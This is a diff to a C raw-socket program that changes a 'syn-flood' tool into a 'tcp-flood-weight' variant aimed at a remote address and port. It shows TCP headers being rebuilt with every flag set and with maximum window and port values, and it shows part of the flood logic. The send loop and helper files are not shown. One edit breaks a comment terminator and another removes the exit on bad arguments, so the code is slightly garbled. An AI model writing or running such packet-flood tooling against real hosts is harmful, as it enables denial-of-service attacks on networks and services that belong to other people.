@@ -2,13 +2,12 @@
 #include "ip-constructors.c"
 #include "applications.c"
 #include "constants.h"
-
 // Arguments standarized and checked //
-// Respects executable [[--source-addr saddr] [--[remote|broadcast]-addr raddr] [--source-port sport] [--remote-port rport] [--n N]] //
+// Respects executable [[--source-addr saddr] [--[remote|broadcast]-addr raddr] [--source-port sport] [--remote-port rport] [--n N]] /Y
 
 int main(int argc,char* argv[]){
 	srand(time(NULL));
-    if(argc!=7){ fprintf(stdout,"Usage: syn-flood --remote-addr raddr --remote-port rport --n N"); exit(0); }
+    if(argc!=7) fprintf(stdout,"Usage: tcp-flood-weight --remote-addr raddr --remote-port rport --n N");
 	else{	
 		
 		/** Example source address and source port **/
@@ -32,14 +31,14 @@ int main(int argc,char* argv[]){
 		TCP_HEADER *tcp_hdr = (TCP_HEADER *)(buffer + sizeof(IP_HEADER));
 
 		/** Fill your headers (IP && TCP in this case) **/
-		set_ip_header(ip_hdr,IP_VERSION_V6,IP_DEFAULT_IHL,IP_CURRENT_TOS,IP_DEFAULT_IDENTIFICATION,0,0,0,\
+		set_ip_header(ip_hdr,IP_VERSION_V6,IP_DEFAULT_IHL,IP_CRITIC_TOS,IP_DEFAULT_IDENTIFICATION,0,0,0,\
 			      IP_DEFAULT_FRAGMENT_OFFSET,IP_DEFAULT_TTL,IP_TCP_PROTOCOL,0,source_address,remote_address,0);
 
 		/** Use auxiliar functions to warn of current status **/
 		SHOW_CREATED_IP_HEADER(ip_hdr);
 		
-		set_tcp_header(tcp_hdr,source_port,remote_port,0,0,TCP_DEFAULT_OFFSET,TCP_DEFAULT_RESERVED,0,1,0,0,0,0,0,0, \
-			       TCP_DEFAULT_WINDOW,0,0,buffer);
+		set_tcp_header(tcp_hdr,source_port,remote_port,65535,65535,254,254,1,1,1,1,1,1,1,1, \
+			       65535,1,9999,buffer);
 		
 		SHOW_CREATED_TCP_HEADER(tcp_hdr);
 
@@ -53,3 +52,4 @@ int main(int argc,char* argv[]){
 	}
 	return 0;
 }
+
